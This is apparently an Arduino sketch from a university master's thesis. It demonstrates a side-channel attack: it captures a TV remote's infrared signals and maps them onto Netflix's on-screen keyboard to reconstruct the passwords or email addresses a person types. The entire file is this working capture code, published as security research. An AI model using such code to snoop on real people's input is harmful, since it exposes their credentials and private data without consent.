/*
**** Master Thesis - UC3M ****
* DAVID MANZANO SÁNCHEZ
* david.manzano@alumnos.uc3m.es
* 
* This code treats to guess passwords or personal data by capturing IR codes sent from a TV control to a Smart TV.
* A Netflix alphanumeric QWERTY keyboard on a Smart Tv is simulated in order to simulate the attack.
* 
* This code uses IRLremote Arduino library from Nico Hood.
* Available: https://github.com/NicoHood/IRLremote
* 
*/
#include <IRLremote.h>
/* Change this values if simulating different keyboard */
#define ROWS 6
#define COLUMNS 10
/* Put here your HEX values from your remote control to use this sketch */
#define UP 765
#define DOWN 33405
#define LEFT 57375
#define RIGHT 24735
#define OK 8925

int INTERRUPTION = 0;

String final_input[500];
int in_cont = 0;
bool upper = false;

uint8_t  myProtocol = 0;
uint16_t myAddress = 0;
uint32_t myKey     = 0;

uint8_t oldSREG;
int i, j;

String kb_qwerty_netflix[ROWS][COLUMNS] =
{
  {"1",    "2",     "3",   "4",   "5",   "6",   "7",   "8",   "9",   "0"},
  {"q",    "w",     "e",   "r",   "t",   "y",   "u",   "i",   "o",   "p"},
  {"a",    "s",     "d",   "f",   "g",   "h",   "j",   "k",   "l",   "-"},
  {"-*",   "*-",    "z",   "x",   "c",   "v",   "b",   "n",   "m",   "_"},
  {"mis",  "mis",  "mis", "mis", "mis", "mis", "mis", "mis", "mis", "mis"},
  {"-spec","spec-", "-@",  "@-",  ".", "-.com",".com-","-del", "del", "del-"}
};

/* 
* printResult function
* Prints current input status array
*/
void printResult(){
  for(int r=0; r<in_cont; r++)
    Serial.print(final_input[r]);
  Serial.println("");
}

/* SETUP function */
void setup() {
  IRLbegin<IR_ALL>(INTERRUPTION);
  Serial.begin(115200);
  i = 2;
  j = 4;

  Serial.println("Alphanumeric QWERTY keyboard of Netflix: \n");
  for(int q=0;q<ROWS;q++){
    for(int w=0;w<COLUMNS;w++){
      Serial.print(kb_qwerty_netflix[q][w]); Serial.print("  ");
  }
  Serial.println(""); Serial.println("");
  }
  Serial.println("[ Cursor begins on initial character \"g\" in the middle of the keyboard ]");
  Serial.println("****************** RECEIVING IR INPUT... ******************\n\n");
}

/* 
* IRLEvent function
* Rewritting IREvent function to control the reception of IR params... 
*/
void IREvent (uint8_t protocol, uint16_t address, uint32_t command) {

  if (address == 0) {
    command = myKey;
  }
  myKey = command;
  myProtocol = protocol;
  myAddress = address;

  
  if(i == ROWS-1){
    switch (myKey) {
      case OK: // OK
        if (kb_qwerty_netflix[i][j].equals("-del") || kb_qwerty_netflix[i][j].equals("del") || kb_qwerty_netflix[i][j].equals("del-")){
            Serial.print("\nOK pressed ->  "); Serial.print("DELETE letter! ->   ");
            if(in_cont != 0){
              in_cont--;
              final_input[in_cont]="";
              printResult();
            }
            else
              Serial.println("");
        }
        else{
          if(kb_qwerty_netflix[i][j].equals("-@") || kb_qwerty_netflix[i][j].equals("@-"))
            final_input[in_cont] = "@";
          else if(kb_qwerty_netflix[i][j].equals("-.com") || kb_qwerty_netflix[i][j].equals(".com-")){
            final_input[in_cont] = "."; in_cont++; final_input[in_cont] = "c"; in_cont++; final_input[in_cont] = "o"; in_cont++; final_input[in_cont] = "m"; 
          }
          else if (kb_qwerty_netflix[i][j].equals("-spec") || kb_qwerty_netflix[i][j].equals("spec-")){
            Serial.print("\n\n**** SORRY, SPECIAL CHARACTERS STILL NOT IMPLEMENTED :( ****\n"); Serial.println("It will appear in the final output as \"\\s/\"");
            final_input[in_cont] = "\\s/";
          }
          else // dot case (.)
            final_input[in_cont] = ".";
          in_cont++;
          Serial.print("\nOK pressed ->  ");
          printResult();
        }
      break;
      case UP: // ARRIBA
        if (i == 0)
          i = ROWS-1;
        else
          i--;
        break;
      case DOWN: // ABAJO
        if (i == ROWS-1)
          i = 0;
        else
          i++;
        break;
      case LEFT: // IZQUIERDA
        if (j == 0)
          j = COLUMNS-1;
        else{
          if(kb_qwerty_netflix[i][j].equals("@-") || kb_qwerty_netflix[i][j].equals(".com-") || kb_qwerty_netflix[i][j].equals("del"))
            j-=2;
          else if(kb_qwerty_netflix[i][j].equals("spec-"))
            j=COLUMNS-1;
          else if(kb_qwerty_netflix[i][j].equals("del-"))
            j-=3;
          else
            j--;
        }
        break;
      case RIGHT: // DERECHA
        if (j == COLUMNS-1)
          j = 0;
        else{
          if(kb_qwerty_netflix[i][j].equals("-spec") || kb_qwerty_netflix[i][j].equals("-@") || kb_qwerty_netflix[i][j].equals("-.com") || kb_qwerty_netflix[i][j].equals("del"))
            j+=2;
          else if(kb_qwerty_netflix[i][j].equals("-del"))
            j=0;
          else
            j++;  
        }
        break;
    }
  }
  else{
    switch (myKey) {
      case OK: // OK
        if(kb_qwerty_netflix[i][j].equals("-*") && upper == false){
          upper = true;
          Serial.print("\nOK pressed ->  "); Serial.println("UPPERCASE enabled");
        }
        else if (kb_qwerty_netflix[i][j].equals("*-") && upper == false){
          upper = true;
          Serial.print("\nOK pressed ->  "); Serial.println("UPPERCASE enabled");
        }
        else if (kb_qwerty_netflix[i][j].equals("-*") && upper == true){
          upper = false;
          Serial.print("\nOK pressed ->  "); Serial.println("UPPERCASE disabled");
        }
        else if (kb_qwerty_netflix[i][j].equals("*-") && upper == true){
          upper = false;
          Serial.print("\nOK pressed ->  "); Serial.println("UPPERCASE disabled");
        }
        else if (!kb_qwerty_netflix[i][j].equals("-*") && !kb_qwerty_netflix[i][j].equals("*-") ){
          if(kb_qwerty_netflix[i][j].equals("mis")){
            Serial.println("\n\n**** Keyboard suggestion selected caused input missing! :( ****\nIt will appear in the final output as \"\\m/\"");
            final_input[in_cont] = "\\m/";
          }
          else{
            if(upper == true){
              kb_qwerty_netflix[i][j].toUpperCase();
              final_input[in_cont] = kb_qwerty_netflix[i][j];
              kb_qwerty_netflix[i][j].toLowerCase();
            }
            if(upper == false)
              final_input[in_cont] = kb_qwerty_netflix[i][j];
          }
          in_cont++;
          Serial.print("\nOK pressed ->  ");
          printResult();
        }
        
        break;
      case UP: // ARRIBA
        if (i == 0)
          i = ROWS-1;
        else
          i--;
        break;
      case DOWN: // ABAJO
        if (i == ROWS-1)
          i = 0;
        else
          i++;
        break;
      case LEFT: // IZQUIERDA
        if (j == 0)
          j = COLUMNS-1;
        else{
          if(kb_qwerty_netflix[i][j].equals("*-"))
            j = COLUMNS-1;
          else
            j--;
        }
        break;
      case RIGHT: // DERECHA
        if (j == COLUMNS-1)
          j = 0;
        else{
          if(kb_qwerty_netflix[i][j].equals("-*"))
            j+=2;
          else
            j++;
        }
        break;
    }
  }
  Serial.print(i); Serial.print("|"); Serial.print(j); Serial.print("  "); Serial.print(protocol); Serial.print("  ");
}

/* LOOP function */
void loop() {
  // Block other interruptions to avoid IR code execution to be interrupted again
  oldSREG = SREG; // backup of registry
  cli(); // modifies 7th bit of registry to avoid interruptions
  
  if (myProtocol != 0) {
    if (myAddress == 0) {
      Serial.print("***UNKNOWN remote control***     ");
      myKey = 0;
      Serial.print("(Protocol,Address,KeyValue-residual) : ("); Serial.print(myProtocol); Serial.print(","); Serial.print(myAddress); Serial.print(","); Serial.print(myKey); Serial.println(")");
    }
    else {
      Serial.print(myAddress); Serial.print("  ");
      for(int h=1; h<5-log10(myKey); h++) Serial.print('0');  // padd with 0
      Serial.print(myKey); Serial.print("   ");
      switch (myKey) {
        case 8925:
          Serial.println("OK\n"); break;
        case 765:
          Serial.print("Arriba     -->  ("); Serial.print(kb_qwerty_netflix[i][j]); Serial.println(")"); break;
        case 33405:
          Serial.print("Abajo      -->  ("); Serial.print(kb_qwerty_netflix[i][j]); Serial.println(")"); break;
        case 57375:
          Serial.print("Izquierda  -->  ("); Serial.print(kb_qwerty_netflix[i][j]); Serial.println(")"); break;
        case 24735:
          Serial.print("Derecha    -->  ("); Serial.print(kb_qwerty_netflix[i][j]); Serial.println(")"); break;
        default:
          Serial.println("No key stored in program recognised"); break;
      }
    }
    myProtocol = 0; myAddress = 0;
  }
    // Restoring registry to recover interruptions
  SREG = oldSREG;
}
